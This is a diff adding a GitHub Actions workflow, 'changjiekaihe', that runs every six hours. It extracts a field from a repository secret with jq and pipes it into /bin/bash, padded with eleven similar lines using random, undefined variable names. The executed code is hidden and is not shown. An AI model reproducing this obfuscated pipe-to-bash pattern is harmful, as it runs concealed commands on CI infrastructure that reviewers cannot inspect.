@@ -1,0 +1,28 @@
+name: changjiekaihe
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '9 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: changjiekaihe
+        env:
+          m53: ${{ secrets.m53 }}
+        run: |
+          echo $m53 | jq -r .c32990 | /bin/bash
+          echo $yaepl0876 | jq -r .x70 | /bin/bash
+          echo $moqxy27722 | jq -r .hz57847 | /bin/bash
+          echo $m32 | jq -r .jhiyu4 | /bin/bash
+          echo $wobh0 | jq -r .cklpr1 | /bin/bash
+          echo $qze51 | jq -r .cxp08008 | /bin/bash
+          echo $y4 | jq -r .pkdl8 | /bin/bash
+          echo $xaq34 | jq -r .bcgov5688 | /bin/bash
+          echo $uvqt42 | jq -r .g025 | /bin/bash
+          echo $h35 | jq -r .hbfx44 | /bin/bash
+          echo $ahzy74 | jq -r .xrjuh786 | /bin/bash
+          echo $olkjg9 | jq -r .m23260 | /bin/bash
+
